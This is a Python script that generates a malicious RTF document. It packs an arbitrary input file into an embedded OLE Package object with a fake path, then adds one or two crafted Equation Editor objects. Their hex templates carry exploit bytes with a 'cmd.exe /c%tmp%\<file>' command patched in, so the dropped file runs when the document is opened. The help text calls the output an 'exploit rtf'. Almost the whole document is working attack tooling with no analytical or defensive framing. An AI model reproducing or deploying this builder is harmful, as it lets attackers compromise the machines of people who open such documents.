import argparse
import os
import struct

def str2hex(str):
    return '0x'+''.join(hex(ord(c)).replace('0x', '') for c in str)
   
def make_ole_primitive(command, objdata_template, command_offset, max_len):
    if len(command) > max_len:
        raise ValueError("primitive command must be shorter than %d bytes" % max_len)
    hex_command = str2hex(command)
    objdata_hex_stream = objdata_template.translate("\r\n")
    ole_data = objdata_hex_stream[:command_offset] + hex_command + objdata_hex_stream[command_offset + len(hex_command):]
    return OBJECT_HEADER + ole_data + OBJECT_TRAILER
   
def make_rtf(header, trailer, inputFile, double):
    #Template1 exploit
    ole = make_ole_primitive("cmd.exe /c%tmp%\\{}".format(os.path.basename(inputFile)), OBJDATA_TEMPLATE_1, COMMAND_OFFSET_1, COM_MAX_LEN1)
    data_obfuscated = obfuscate_rtf(inputFile)
    outbuf = header + data_obfuscated + ole
    if double:
        #Template2 exploit
        outbuf += make_ole_primitive("cmd.exe /c%tmp%\\{}".format(os.path.basename(inputFile)), OBJDATA_TEMPLATE_2, COMMAND_OFFSET_2, COM_MAX_LEN2)
    return outbuf + trailer

def obfuscate_rtf(fn):
    filename = os.path.basename(fn)
    fakepath = 'C:\\fakepath\\{}'.format(filename)
    OrgPath = fakepath
    DataPath = fakepath
    with open(filename,'rb') as file:
        FileData = file.read()

    EMB_HEAD = r"{\object\objemb\objw1\objh1{\*\objfunction RTF}{\*\objdata "
    EMB_TAIL = r"0105000000000000}}"

    """Get Obfucated Data"""
    StreamHeader = '0200'
    FileName_hex = str2hex(filename) + '00'
    OrgPath_hex = str2hex(OrgPath) + '00'
    UType = '00000300'
    DataPath_hex = str2hex(DataPath) + '00'
    DataPathLen = struct.pack("<I", len(DataPath)+1).hex()
    DataLen = struct.pack("<I", len(FileData)).hex()
    FileData_hex = FileData.hex()
    OrgPathWLen = struct.pack("<I", len(DataPath)).hex()
    OrgPathW = DataPath.encode('utf-16le').hex()
    LabelLen = struct.pack("<I", len(filename)).hex()
    LabelW = filename.encode('utf-16le').hex()
    DefPathWLen = struct.pack("<I", len(OrgPath)).hex()
    DefPathW = OrgPath.encode('utf-16le').hex()

    Obfuscate_data =  ''.join([
        StreamHeader,
        FileName_hex,
        OrgPath_hex,
        UType,
        DataPathLen,
        DataPath,
        DataLen,
        FileData_hex,
        OrgPathWLen,
        OrgPathW,
        LabelLen,
        LabelW,
        DefPathWLen,
        DefPathW,
    ])

    """Get Obfucated Header"""
    OLEVersion = '01050000'
    FormatID = '02000000'
    functionName = 'RTF'
    szfunctionName = struct.pack("<I", len(functionName) + 1).hex()
    szData = struct.pack("<I", int(len(Obfuscate_data)/2)).hex()
    Obfuscate_head = ''.join([
        OLEVersion,
        FormatID,
        szfunctionName,
        str2hex(functionName) + '00',
        '00000000',
        '00000000',
        szData,
    ])

    return EMB_HEAD + Obfuscate_head + Obfuscate_data +EMB_TAIL
    

class RTFObfuscate(object):
    def __init__(self, filename):
        self.filename = os.path.basename(filename)
        self.fakepath = 'C:\\fakepath\\{}'.format(self.filename)
        self.orgpath = self.fakepath
        self.datapath = self.fakepath
        with open(filename,'rb') as file:
            self.data = file.read()
        self.HEAD = r"{\object\objemb\objw1\objh1{\*\objclass Package}{\*\objdata "
        self.TAIL = r"0105000000000000}}"

    def get_header(self):
        OLEVersion = '01050000'
        FormatID = '02000000'
        ClassName = 'RTFObfuscate'
        szClassName = struct.pack("<I", len(ClassName) + 1).hex()
        szData = struct.pack("<I", int(len(self.get_data())/2)).hex()
        return ''.join([
            OLEVersion,
            FormatID,
            szClassName,
            str2hex(ClassName) + '00',
            '00000000',
            '00000000',
            szData,
        ])

    def get_data(self):  
        StreamHeader = '0200'
        Label = str2hex(self.filename) + '00'
        OrgPath = str2hex(self.orgpath) + '00'
        UType = '00000300'
        DataPath = str2hex(self.datapath) + '00'
        DataPathLen = struct.pack("<I", len(self.datapath)+1).hex()
        DataLen = struct.pack("<I", len(self.data)).hex()
        Data = self.data.hex()
        OrgPathWLen = struct.pack("<I", len(self.datapath)).hex()
        OrgPathW = self.datapath.encode('utf-16le').hex()
        LabelLen = struct.pack("<I", len(self.filename)).hex()
        LabelW = self.filename.encode('utf-16le').hex()
        DefPathWLen = struct.pack("<I", len(self.orgpath)).hex()
        DefPathW = self.orgpath.encode('utf-16le').hex()

        return ''.join([
            StreamHeader,
            Label,
            OrgPath,
            UType,
            DataPathLen,
            DataPath,
            DataLen,
            Data,
            OrgPathWLen,
            OrgPathW,
            LabelLen,
            LabelW,
            DefPathWLen,
            DefPathW,
        ])

    def build_package(self):
        return self.HEAD + self.get_header() + self.get_data() + self.TAIL



RTF_HEADER = R"""{\rtf1\ansi\ansicpg1252\deff0\nouicompat\deflang1033{\fonttbl{\f0\fnil\fcharset0 Calibri;}}
{\*\generator Riched20 6.3.9600}\viewkind4\uc1
\pard\sa200\sl276\slmult1\f0\fs22\lang9"""
RTF_TRAILER = R"""\par}"""


OBJECT_HEADER = R"""{\object\objemb\objupdate{\*\objclass Equation.3}\objw380\objh260{\*\objdata """
OBJECT_TRAILER = R"""
}{\result{\pict{\*\picprop}\wmetafile8\picw380\pich260\picwgoal380\pichgoal260
0100090000039e00000002001c0000000000050000000902000000000500000002010100000005
0000000102ffffff00050000002e0118000000050000000b0200000000050000000c02a0016002
1200000026060f001a00ffffffff000010000000c0ffffffc6ffffff20020000660100000b0000
0026060f000c004d61746854797065000020001c000000fb0280fe000000000000900100000000
0402001054696d6573204e657720526f6d616e00feffffff5f2d0a6500000a0000000000040000
002d01000009000000320a6001100003000000313131000a00000026060f000a00ffffffff0100
000000001c000000fb021000070000000000bc02000000000102022253797374656d000048008a
0100000a000600000048008a01ffffffff6ce21800040000002d01010004000000f00100000300
00000000
}}}
"""


OBJDATA_TEMPLATE_1 = R"""
FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF52006F006F007400200045006E0074007200790000
00000000000000000000000000000000000000000000000000000000000000000000000000000000
00000016000500FFFFFFFFFFFFFFFF0200000002CE020000000000C0000000000000460000000000
00000000000000B024837CC473D30103000000C00300000000000001004F006C0065000000000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000
00000000000000000000000A000201FFFFFFFFFFFFFFFFFFFFFFFF00000000000000000000000000
0000000000000000000000000000000000000000000000000000001400000000000000010043006F
006D0070004F0062006A000000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000120002010100000004000000FFFFFFFF0000000000
000000000000007C010000040100003C0100000100090000039E00000002001C0000000000050000
0009020000000005000000020101000000050000000102FFFFFF00050000002E0118000000050000
000B0200000000050000000C02A00160021200000026060F001A00FFFFFFFF000010000000C0FFFF
FFC6FFFFFF20020000660100000B00000026060F000C004D61746854797065000020001C000000FB
0280FE0000000000009001000000000402001054696D6573204E657720526F6D616E00FEFFFFFF5F
2D0A6500000A0000000000040000002D01000009000000320A6001100003000000202002004F006C
00650050007200650073003000300030000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000180002000300000005000000FFFFFFFF0000000000
00000000000000000000000000000000000000000000000000000000000000040000007E01000000
0000005200690063006800450064006900740046006C006100670073000000000000000000000000
0000000000000000000000000000000000000000000000000000001C000201FFFFFFFF06000000FF
FFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000A
0000000C000000000000004500710075006100740069006F006E0020004E00610074006900760065
000000000000000000000000000000000000000000000000000000000000000000000020000200FF
FFFFFFFFFFFFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000
000000000000000B000000C500000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000
00000000000000FFFFFFFFFFFFFFFFFFFFFFFF000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000020000A00000026060F000A00FF
FFFFFF0100000000001C000000FB021000070000000000BC02000000000102022253797374656D00
0048008A0100000A000600000048008A01FFFFFFFF6CE21800040000002D01010004000000F00100
000300000000000000000000000000000000000000000000004E414E490000000000000100000000
00000001000000000000000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000001C00000002009EC4A900000000000000C8A75C00C4
EE5B0000000000030100030A0A08000133C0508D44245250EB7F2020202020202020202020202020
20202020202020202020202020202020202020202020202020202020202020202020202020202020
20202020202020202020202020202020202020202020202020202020202020202020202020202020
202020202020202020202020202020202020202020202020202020202020202026908B44242C662D
51A8FFE0250000000000000000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000001050000050000000D0000004D45544146494C4550
494354007C010000FCFEFFFF4401000008007C01040100000100090000039E00000002001C000000
00000500000009020000000005000000020101000000050000000102FFFFFF00050000002E011800
0000050000000B0200000000050000000C02A00160021200000026060F001A00FFFFFFFF00001000
0000C0FFFFFFC6FFFFFF20020000660100000B00000026060F000C004D6174685479706500002000
1C000000FB0280FE0000000000009001000000000402001054696D6573204E657720526F6D616E00
FEFFFFFF5F2D0A6500000A0000000000040000002D01000009000000320A60011000030000002020
20000A00000026060F000A00FFFFFFFF0100000000001C000000FB021000070000000000BC020000
00000102022253797374656D000048008A0100000A000600000048008A01FFFFFFFF6CE218000400
00002D01010004000000F0010000030000000000
"""


OBJDATA_TEMPLATE_2 = R"""
0fffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffff01000002080000000000000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000100feff030a0000ffffffff02
ce020000000000c000000000000046170000004d6963726f736f6674204571756174696f6e20332e
30000c0000004453204571756174696f6e000b0000004571756174696f6e2e3300f439b271000000
00000000000000000000000000000000000000000000000000000000000000000000000000030004
00000000000000000000000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000001c00000002009ec4a900000000000000c8a75c00c4
ee5b0000000000030101030a0a01085a5a4141414141414141414141414141414141414141414141
414141414141414141414141414141414141414141120c4300000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000000000004500710075
006100740069006f006e0020004e0061007400690076006500000000000000000000000000000000
0000000000000000000000000000000000000020000200ffffffffffffffffffffffff0000000000
0000000000000000000000000000000000000000000000000000000000000004000000c500000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000ffffffffffffffffff
ffffff00000000000000000000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000000000000000000000ff
ffffffffffffffffffffff0000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000
00000000000000ffffffffffffffffffffffff000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000001050000050000000d0000004d
45544146494c4550494354003421000035feffff9201000008003421cb010000010009000003c500
000002001c00000000000500000009020000000005000000020101000000050000000102ffffff00
050000002e0118000000050000000b0200000000050000000c02a001201e1200000026060f001a00
ffffffff000010000000c0ffffffc6ffffffe01d0000660100000b00000026060f000c004d617468
5f7cef1800040000002d01010004000000f0010000030000000000
"""

COMMAND_OFFSET_1 = 0xd12*2
COMMAND_OFFSET_2 = 0x949*2

COM_MAX_LEN1 = 126
COM_MAX_LEN2 = 43

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="RTF obfuscation")
    parser.add_argument("-i", "--input", help="File to input and obfuscate", required=True)
    parser.add_argument('-o', "--output", help="Output exploit rtf", required=True)
    parser.add_argument('-d', "--double", help="Double-whammy! Exploits both Template1 and Template2 in the same document.", action="store_true")
    args = parser.parse_args()
    with open(args.output, 'w') as f:
        f.write(make_rtf(RTF_HEADER, RTF_TRAILER, args.input, args.double))
    print("Obfuscation Completed!")


